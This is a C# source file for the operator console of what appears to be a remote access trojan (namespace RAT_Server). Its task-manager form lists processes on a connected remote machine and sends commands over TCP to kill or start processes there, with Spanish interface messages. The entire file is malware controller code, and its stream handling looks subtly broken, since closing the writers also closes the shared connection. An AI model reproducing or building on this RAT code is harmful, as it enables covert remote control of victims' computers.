using System;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RAT_Server
{
    public partial class TaskManagerForm : Form
    {
        private TcpClient client;
        private CancellationTokenSource cancellationTokenSource;

        public TaskManagerForm(TcpClient client)
        {
            InitializeComponent();
            this.client = client;
            cancellationTokenSource = new CancellationTokenSource();

            Task.Run(() => LoadProcesses(cancellationTokenSource.Token));
        }

        private void LoadProcesses(CancellationToken cancellationToken)
        {
            try
            {
                var stream = client.GetStream();
                using (var writer = new StreamWriter(stream))
                using (var reader = new StreamReader(stream))
                {
                    writer.WriteLine("GET_PROCESSES");
                    writer.Flush();

                    Invoke((MethodInvoker)(() =>
                    {
                        listViewProcesses.Items.Clear();
                    }));

                    while (!cancellationToken.IsCancellationRequested)
                    {
                        var processInfo = reader.ReadLine();
                        if (string.IsNullOrEmpty(processInfo)) break;

                        var parts = processInfo.Split('|');
                        if (parts.Length == 3)
                        {
                            Invoke((MethodInvoker)(() =>
                            {
                                var item = new ListViewItem(parts[0]);
                                item.SubItems.Add(parts[1]);
                                item.SubItems.Add(parts[2]);
                                listViewProcesses.Items.Add(item);
                            }));
                        }
                    }
                }
            }
            catch (IOException)
            {
                if (!cancellationToken.IsCancellationRequested)
                {
                    MessageBox.Show("La conexión con el cliente se perdió.");
                }
            }
            catch (Exception ex)
            {
                if (!cancellationToken.IsCancellationRequested)
                {
                    MessageBox.Show($"Error al cargar los procesos: {ex.Message}");
                }
            }
        }

        private void menuKillProcess_Click(object sender, EventArgs e)
        {
            if (listViewProcesses.SelectedItems.Count > 0)
            {
                var processId = listViewProcesses.SelectedItems[0].SubItems[1].Text;
                Task.Run(() => SendCommand($"KILL_PROCESS|{processId}"));
            }
        }

        private void menuStartProcess_Click(object sender, EventArgs e)
        {
            var processName = Microsoft.VisualBasic.Interaction.InputBox(
                "Introduce el nombre del proceso a iniciar:",
                "Iniciar proceso",
                ""
            );

            if (!string.IsNullOrEmpty(processName))
            {
                Task.Run(() => SendCommand($"START_PROCESS|{processName}"));
            }
        }

        private void SendCommand(string command)
        {
            try
            {
                var stream = client.GetStream();
                using (var writer = new StreamWriter(stream))
                {
                    writer.WriteLine(command);
                    writer.Flush();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error al enviar el comando: {ex.Message}");
            }
        }

        private void TaskManagerForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            cancellationTokenSource.Cancel();
        }
    }
}
